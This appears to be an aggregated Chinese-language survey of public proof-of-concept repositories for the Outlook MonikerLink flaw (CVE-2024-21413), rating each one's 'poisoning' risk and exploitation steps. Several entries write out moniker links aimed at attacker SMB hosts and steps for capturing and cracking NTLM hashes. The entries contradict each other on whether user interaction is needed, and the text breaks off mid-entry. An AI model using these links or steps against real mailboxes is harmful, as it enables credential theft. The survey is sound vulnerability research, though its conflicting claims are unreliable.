CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
